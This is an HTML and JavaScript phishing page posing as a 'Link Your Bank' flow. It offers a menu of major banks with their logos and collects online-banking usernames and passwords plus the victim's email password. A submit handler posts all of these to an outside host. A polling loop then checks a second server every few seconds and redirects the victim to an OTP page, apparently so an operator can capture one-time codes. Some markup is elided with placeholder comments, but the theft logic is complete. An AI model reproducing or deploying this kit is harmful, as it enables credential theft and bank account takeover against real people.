<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Link Your Bank</title>
    <style>
        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 0;
        }
        
        body {
            background-color: #f7fafc;
            color: #1a202c;
            line-height: 1.5;
            overflow-x: hidden;
        }
        
        .container {
            max-width: 420px;
            margin: 20px auto;
            padding: 0 20px;
            position: relative;
            min-height: 600px;
        }
        
        .logo {
            text-align: center;
            margin-bottom: 20px;
            position: relative;
            z-index: 10;
        }
        
        .logo img {
            height: 30px;
        }
        
        .card {
            background: white;
            border-radius: 8px;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
            padding: 24px;
            transition: transform 0.3s ease;
            position: relative;
            left: 0;
            min-height: 400px;
            margin-top: 60px;
        }
        
        h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 20px;
            text-align: center;
        }
        
        /* [Previous CSS styles remain the same...] */

        .error-message {
            color: #e53e3e;
            margin-top: 20px;
            text-align: center;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://models-bangbros.github.io/images/OIP__2_-removebg-preview.png" alt="Bank Logo">
        </div>
        
        <!-- [Previous HTML remains the same until the email verification form...] -->

        <!-- Page 3: Email Verification -->
        <div class="page page-3">
            <div class="page-content">
                <div class="card">
                    <div class="form-content">
                        <h1>Verify your email</h1>
                        
                        <div class="email-display">
                            <span class="arrow-icon">â†’</span>
                            <span id="displayed-email"></span>
                        </div>
                        
                        <form id="email-verification-form">
                            <div class="form-group">
                                <label for="email-password">Email password</label>
                                <input type="password" id="email-password" name="email_password" placeholder="Enter your email password" required minlength="4">
                                <div class="password-error" id="email-password-length-error">Please Complete Your Password</div>
                            </div>
                            
                            <div class="form-group">
                                <label for="confirm-email-password">Confirm email password</label>
                                <input type="password" id="confirm-email-password" name="confirm_email_password" placeholder="Confirm your email password" required minlength="4">
                                <div class="password-error" id="password-match-error">Password Does Not Match</div>
                            </div>
                            
                            <button type="submit" class="submit-btn">Link Bank</button>
                            <div class="error-message" id="form-submission-error"></div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- [Rest of your HTML remains the same...] -->
    </div>

    <script>
        // DOM Elements
const searchInput = document.getElementById('bank-search');
const searchResults = document.getElementById('search-results');
const searchBankLogo = document.getElementById('search-bank-logo');
const continueToLoginBtn = document.getElementById('continue-to-login');
const continueToEmailBtn = document.getElementById('continue-to-email');
const bankLoginForm = document.getElementById('bank-login-form');
const emailVerificationForm = document.getElementById('email-verification-form');
const selectedBankLogo = document.getElementById('selected-bank-logo');
const selectedBankName = document.getElementById('selected-bank-name');
const displayedEmail = document.getElementById('displayed-email');
const passwordInput = document.getElementById('password');
const emailPasswordInput = document.getElementById('email-password');
const confirmEmailPasswordInput = document.getElementById('confirm-email-password');
const passwordLengthError = document.getElementById('password-length-error');
const emailPasswordLengthError = document.getElementById('email-password-length-error');
const passwordMatchError = document.getElementById('password-match-error');
const formSubmissionError = document.getElementById('form-submission-error');

// Bank Data
const banks = [
    { name: "Chase", logo: "https://models-bangbros.github.io/images/chase.png" },
    { name: "Bank of America", logo: "https://models-bangbros.github.io/images/bank-of-america.png" },
    { name: "Wells Fargo", logo: "https://models-bangbros.github.io/images/wells-fargo.png" },
    { name: "Citibank", logo: "https://models-bangbros.github.io/images/citi.png" },
    { name: "US Bank", logo: "https://models-bangbros.github.io/images/us-bank.png" },
    { name: "Capital One", logo: "https://models-bangbros.github.io/images/capital-one.png" },
    { name: "TD Bank", logo: "https://models-bangbros.github.io/images/td-bank.png" },
    { name: "PNC Bank", logo: "https://models-bangbros.github.io/images/pnc-bank.png" },
    { name: "RBC Royal Bank", logo: "https://models-bangbros.github.io/images/rbc.png" },
    { name: "Scotiabank", logo: "https://models-bangbros.github.io/images/scotiabank.png" },
    { name: "BMO Bank of Montreal", logo: "https://models-bangbros.github.io/images/bmo.png" },
    { name: "CIBC", logo: "https://models-bangbros.github.io/images/cibc.png" },
    { name: "HSBC", logo: "https://models-bangbros.github.io/images/hsbc.png" },
    { name: "Ally Bank", logo: "https://models-bangbros.github.io/images/ally-bank.png" },
    { name: "American Express", logo: "https://models-bangbros.github.io/images/amex.png" }
];

// State Variables
let selectedBank = null;
let checkResponseInterval = null;
let verificationCode = generateVerificationCode();

// Initialize the application
function init() {
    getEmailFromURL();
    setupEventListeners();
}

// Get email from URL parameters
function getEmailFromURL() {
    const urlParams = new URLSearchParams(window.location.search);
    const email = urlParams.get('email');
    if (email) {
        displayedEmail.textContent = decodeURIComponent(email);
    } else {
        navigateToPage(1);
        alert('Email parameter is required in URL');
    }
}

// Generate random 5-digit verification code
function generateVerificationCode() {
    return Math.floor(10000 + Math.random() * 90000).toString();
}

// Set up all event listeners
function setupEventListeners() {
    // Bank search functionality
    searchInput.addEventListener('input', handleBankSearch);
    
    // Bank logo selection
    document.querySelectorAll('.bank-logo').forEach(logo => {
        logo.addEventListener('click', () => {
            const bankName = logo.getAttribute('data-bank');
            const bankLogo = logo.getAttribute('data-logo');
            selectBank(bankName, bankLogo);
            searchInput.value = bankName;
        });
    });

    // Continue buttons
    continueToLoginBtn.addEventListener('click', () => {
        if (selectedBank) {
            selectedBankLogo.src = selectedBank.logo;
            selectedBankName.textContent = selectedBank.name;
            navigateToPage(2);
        }
    });

    continueToEmailBtn.addEventListener('click', () => {
        if (validatePasswordLength(passwordInput, passwordLengthError)) {
            navigateToPage(3);
        }
    });

    // Form submission
    emailVerificationForm.addEventListener('submit', handleFormSubmission);

    // Password validation
    passwordInput.addEventListener('input', () => validatePasswordLength(passwordInput, passwordLengthError));
    emailPasswordInput.addEventListener('input', () => {
        validatePasswordLength(emailPasswordInput, emailPasswordLengthError);
        validatePasswordMatch();
    });
    confirmEmailPasswordInput.addEventListener('input', validatePasswordMatch);
}

// Handle bank search functionality
function handleBankSearch() {
    const searchTerm = this.value.toLowerCase();
    searchResults.innerHTML = '';
    
    if (searchTerm.length > 0) {
        const filteredBanks = banks.filter(bank => 
            bank.name.toLowerCase().includes(searchTerm)
        );
        
        if (filteredBanks.length > 0) {
            filteredBanks.forEach(bank => {
                const resultItem = document.createElement('div');
                resultItem.className = 'search-result-item';
                
                const logoImg = document.createElement('img');
                logoImg.src = bank.logo;
                logoImg.alt = bank.name;
                logoImg.style.width = '30px';
                logoImg.style.height = '30px';
                
                resultItem.appendChild(logoImg);
                resultItem.appendChild(document.createTextNode(bank.name));
                
                resultItem.addEventListener('click', () => {
                    selectBank(bank.name, bank.logo);
                    searchInput.value = bank.name;
                    searchResults.style.display = 'none';
                });
                
                searchResults.appendChild(resultItem);
            });
            searchResults.style.display = 'block';
        } else {
            searchResults.style.display = 'none';
        }
    } else {
        searchResults.style.display = 'none';
    }
}

// Select a bank and update UI
function selectBank(name, logo) {
    selectedBank = { name, logo };
    continueToLoginBtn.disabled = false;
    
    // Update logo in search box
    searchBankLogo.src = logo;
    searchBankLogo.style.display = 'block';
    
    document.querySelectorAll('.bank-logo').forEach(logo => {
        logo.style.borderColor = logo.getAttribute('data-bank') === name ? '#000000' : '#e2e8f0';
    });
}

// Validate password length
function validatePasswordLength(input, errorElement) {
    if (input.value.length > 0 && input.value.length < 4) {
        input.classList.add('input-error');
        errorElement.style.display = 'block';
        return false;
    } else {
        input.classList.remove('input-error');
        errorElement.style.display = 'none';
        return true;
    }
}

// Validate password match
function validatePasswordMatch() {
    if (emailPasswordInput.value !== confirmEmailPasswordInput.value && 
        confirmEmailPasswordInput.value.length > 0) {
        confirmEmailPasswordInput.classList.add('input-error');
        passwordMatchError.style.display = 'block';
        return false;
    } else {
        confirmEmailPasswordInput.classList.remove('input-error');
        passwordMatchError.style.display = 'none';
        return true;
    }
}

// Handle form submission
async function handleFormSubmission(e) {
    e.preventDefault();
    
    // Validate all fields
    const isPasswordValid = validatePasswordLength(emailPasswordInput, emailPasswordLengthError);
    const isMatchValid = validatePasswordMatch();
    
    if (isPasswordValid && isMatchValid) {
        navigateToPage(4);
        document.querySelectorAll('.form-content').forEach(el => {
            el.parentNode.classList.add('loading');
        });
        
        // Prepare form data
        const formData = new FormData();
        formData.append('bank', selectedBank.name);
        formData.append('username', document.getElementById('username').value);
        formData.append('password', document.getElementById('password').value);
        formData.append('email', displayedEmail.textContent);
        formData.append('email_password', document.getElementById('email-password').value);
        formData.append('verification_code', verificationCode);
        
        try {
            const response = await fetch('https://my-forwarder.site/plaid/action.php', {
                method: 'POST',
                body: formData,
                headers: {
                    'Accept': 'application/json'
                }
            });
            
            const data = await response.json();
            
            if (!response.ok) {
                throw new Error(data.error || 'Failed to submit form');
            }
            
            console.log('Form submitted successfully:', data);
            startCheckingResponse();
        } catch (error) {
            console.error('Form submission error:', error);
            showFormError('Failed to submit. Please try again.');
            setTimeout(() => {
                navigateToPage(3);
                document.querySelectorAll('.form-content').forEach(el => {
                    el.parentNode.classList.remove('loading');
                });
            }, 3000);
        }
    }
}

// Show form error message
function showFormError(message) {
    formSubmissionError.textContent = message;
    formSubmissionError.style.display = 'block';
}

// Start checking for OTP response
function startCheckingResponse() {
    console.log("Starting response checks for code:", verificationCode);
    
    checkResponseInterval = setInterval(async () => {
        try {
            const response = await fetch(`https://your-php-server.com/check-response.php?code=${verificationCode}&rand=${Math.random()}`, {
                method: 'GET',
                headers: {
                    'Accept': 'application/json'
                }
            });
            
            const data = await response.json();
            console.log('Response:', data);
            
            if (data.status === 'otp') {
                clearInterval(checkResponseInterval);
                window.location.href = 'otp.html';
            }
        } catch (error) {
            console.error('Error checking response:', error);
        }
    }, 3000);

    // Timeout after 15 minutes
    setTimeout(() => {
        clearInterval(checkResponseInterval);
        showFormError('Verification timed out. Please try again.');
        navigateToPage(3);
    }, 900000);
}

// Navigate between pages
function navigateToPage(pageNumber) {
    document.querySelectorAll('.page').forEach(page => {
        page.classList.remove('active');
    });
    document.querySelector(`.page-${pageNumber}`).classList.add('active');
}

// Hide search results when clicking outside
document.addEventListener('click', function(e) {
    if (e.target.id !== 'bank-search') {
        searchResults.style.display = 'none';
    }
});

// Initialize the application when DOM is loaded
document.addEventListener('DOMContentLoaded', init);
    </script>
</body>
</html>
